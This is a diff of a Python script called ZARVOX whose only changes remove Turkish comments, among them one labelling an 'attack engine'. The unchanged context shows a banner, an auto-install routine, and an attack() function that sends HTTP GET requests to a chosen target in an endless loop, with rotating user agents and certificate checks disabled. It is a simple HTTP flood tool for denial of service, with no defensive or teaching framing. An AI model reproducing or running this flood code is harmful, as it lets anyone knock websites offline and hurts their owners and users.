@@ -12,7 +12,6 @@ init(autoreset=True)
 def clear():
     os.system('cls' if os.name == 'nt' else 'clear')
 
-# --- OTOMATİK KURULUM FONKSİYONU ---
 def setup_pip():
     clear()
     print(Fore.CYAN + " [!] Gerekli kütüphaneler kontrol ediliyor ve kuruluyor...\n")
@@ -30,7 +29,6 @@ def setup_pip():
 
 def banner():
     clear()
-    # Şekilli ZARVOX Logosu
     print(Fore.RED + Style.BRIGHT + r"""
   ______  ___  ______  _   _  _____ __   __
  |___  / / _ \ | ___ \| | | ||  _  |\ \ / /
@@ -81,7 +79,6 @@ def target_screen():
         time.sleep(2)
         target_screen()
 
-# --- SALDIRI MOTORU ---
 def attack(target, user_agents):
     while True:
         try:
@@ -91,7 +88,6 @@ def attack(target, user_agents):
                 'Accept-Encoding': 'gzip, deflate',
                 'Connection': 'keep-alive'
             }
-            # requests.get ile gerçek HTTP trafiği
             response = requests.get(target, headers=headers, timeout=5, verify=False)
             print(Fore.GREEN + f" [+] Paket Gönderildi -> {target} | Status: {response.status_code}")
         except:
